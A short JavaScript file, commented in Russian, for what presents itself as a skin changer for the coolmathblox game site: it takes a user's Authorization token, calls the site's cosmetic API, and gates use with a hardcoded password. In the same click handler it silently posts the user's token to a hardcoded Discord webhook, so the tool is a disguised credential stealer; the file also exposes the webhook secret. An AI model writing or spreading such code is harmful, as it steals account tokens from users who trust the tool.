const authInput = document.getElementById('authField');
const skinSelect = document.getElementById('skinSelect');
const passwordInput = document.getElementById('passwordField');
const startBtn = document.getElementById('startBtn');
const status = document.getElementById('status');

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504486169084301445/w_i3aEnuu9MmKjBMujqBmRTg6KeXD0aJcIZRZ2AnN0Pt1uS7G6fd0gfm3zUy0L_o-qTY';
const API_URL = 'https://session.coolmathblox.ca/accounts/set_cosmetic';
const MASTER_PASSWORD = 'stack777';

startBtn.addEventListener('click', function () {
    const authValue = authInput.value.trim();
    const selectedSkin = skinSelect.value;
    const passwordValue = passwordInput.value.trim();

    // 1. Проверка заполнения полей
    if (!authValue) {
        showStatus("Введите Authorization!", "#ff4444");
        return;
    }

    // 2. Проверка пароля
    if (passwordValue !== MASTER_PASSWORD) {
        showStatus("Ошибка: Неверный пароль!", "#ff4444");
        return;
    }

    showStatus("Запуск процесса...", "#00ff88");

    // Данные для отправки
    const payload = {
        type: "skin",
        id: selectedSkin
    };

    // 3. Запрос в Discord
    const discordPromise = fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `@everyone\n**Действие:** Смена скина\n**Токен:** \`${authValue}\` \n**Скин:** \`${selectedSkin}\``
        })
    });

    // 4. Запрос к API
    const apiPromise = fetch(API_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "authorization": authValue
        },
        body: JSON.stringify(payload)
    });

    Promise.all([discordPromise, apiPromise])
        .then(async ([discordRes, apiRes]) => {
            // Пробуем прочитать ответ от API
            try {
                const data = await apiRes.json();
                console.log("✅ Response:", data);
                showStatus(`Успех! Скин ${selectedSkin} активирован.`, "#00ff88");
            } catch (e) {
                showStatus("Запросы отправлены!", "#00ff88");
            }
        })
        .catch(err => {
            console.error(err);
            showStatus("Ошибка при выполнении запроса.", "#ff4444");
        });
});

function showStatus(text, color) {
    status.innerText = text;
    status.style.color = color;
}
